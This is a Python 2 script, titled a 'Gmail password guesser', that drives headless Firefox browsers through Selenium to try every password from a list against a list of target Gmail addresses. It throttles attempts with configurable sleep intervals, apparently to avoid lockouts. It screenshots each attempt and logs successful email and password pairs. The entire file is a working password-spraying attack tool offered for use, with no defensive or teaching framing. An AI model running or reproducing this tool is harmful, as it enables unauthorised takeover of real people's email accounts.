#!/usr/bin/env python2

from pyvirtualdisplay import Display
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
from threading import Thread
from Queue import Queue
import argparse

printq = Queue()

class Client:

    def __init__( self, bid, sleep_time, threshold, printq ):
        
        self.bid = bid
        self.sleep_time = sleep_time
        self.threshold = threshold
        self.emails = []
        self.passwords = []
        self.printq = printq
        self.count = 0
        self.finished = False
        
        self.display = Display( visible=0, size=( 1280, 800 ) )
        self.display.start()

        self.browser = webdriver.Firefox()
        self.printq.put( "[>] Initialized browser {}".format( str( self.bid ) ) )

    def run( self ):
        
        for password in self.passwords:
            for email in self.emails:
                try:
                    self.login( email, password )
                except Exception as ERROR:
                    self.printq.put( "[!] Could not submit {}:{}".format( email, password ) )
            
            if self.count % self.threshold == 0:
                self.printq.put( "[>] Browser {} hit threshold, sleeping for {} min".format( 
                    self.bid, str( self.sleep_time )
                ))
                sleep( ( 60 * self.sleep_time ) )

            self.count += 1

        self.finished = True

    def login( self, email, password ):
        
        self.browser.get( "http://mail.google.com" )
        sleep( 3 )
    
        self.action = webdriver.ActionChains( self.browser )
        self.email_form = self.browser.find_element_by_id( "Email" )
        self.email_form.send_keys( email )
        self.next_button = self.browser.find_element_by_id( "next" )
        self.next_button.click()
        sleep( 1 )

        if not self.browser.find_element_by_id( "Passwd" ):
            self.printq.put( "[-] Invalid email, removing {} from scope".format( email ) )
            self.emails.remove( email )
        else:
            self.pass_form = self.browser.find_element_by_id( "Passwd" )
            self.pass_form.send_keys( password )
            self.signin_button = self.browser.find_element_by_id( "signIn" )
            self.signin_button.click()
            sleep( 3 )
            self.browser.save_screenshot( "{}_{}.png".format( email, password ) )

            if "Wrong password" in self.browser.page_source:
                self.printq.put( "[!] Login failed: {}:{}".format( email, password ) )
            else:
                self.printq.put( "[^] Login succeeded: {}:{}".format( email, password ) )

    def __del__( self ):

        self.browser.quit()
        self.display.stop()


def printer():
    while True:
        if printq.empty() is not True:
            msg = printq.get()
            print msg
            printq.task_done()
        else:
            sleep( 0.25 )


if __name__ == "__main__":
    
    emails = None
    passwords = None
    url = None
    threshold = None
    sleep_time = None
    log = None
    printq = Queue()
    clients = []

    parser = argparse.ArgumentParser( "Gmail password guesser" )
    parser.add_argument( "-e", "--emails", required=True, help="email list to target" )
    parser.add_argument( "-p", "--passwords", required=True, help="password list to use" )
    parser.add_argument( "-u", "--url", required=True, help="url of gmail domain" )
    parser.add_argument( "-t", "--threshold", required=True, help="guesses per user before sleeping" )
    parser.add_argument( "-s", "--sleep", required=True, help="amount of minutes to sleep for between cycles" )
    parser.add_argument( "-b", "--browsers", required=False, help="number of browsers to run" )
    parser.add_argument( "-l", "--log", required=False, help="log results to a file" )

    args = vars( parser.parse_args() )

    emails = args["emails"] if args["emails"] else None
    passwords = args["passwords"] if args["passwords"] else None
    url = args["url"] if args["url"] else None
    threshold = int( args["threshold"] ) if args["threshold"] else None
    sleep_time = int( args["sleep"] ) if args["sleep"] else None
    browsers = int( args["browsers"] ) if args["browsers"] else 1
    log = args["log"] if args["log"] else None

    for i in range( 0, browsers ):
        client = Client( i, sleep_time, threshold, printq )
        client.passwords = [ x.rstrip( "\n" ) for x in open( passwords, "r" ).readlines() ]
        clients.append( client )

    count = 0
    for email in [ x.rstrip( "\n" ) for x in open( emails , "r" ).readlines() ]:
        elem = count % len( clients )
        clients[elem].emails.append( email )
        count += 1

    for client in clients:
        proc = Thread( target=client.run )
        proc.daemon = True
        proc.start()

    while True:
        
        if printq.empty() is not True:
            msg = printq.get()
            print msg
            if log is not None:
                with open( log, "a" ) as f:
                    f.write( "{}\n".format( msg ) )
                f.close()
            printq.task_done()
        
        else:            
            total = len( clients )
            votes = 0
            for client in clients:
                if client.finished is True:
                    votes += 1
            
            if votes == total:
                break
            else:
                sleep( 0.25 )
    
    print "[-] Done"
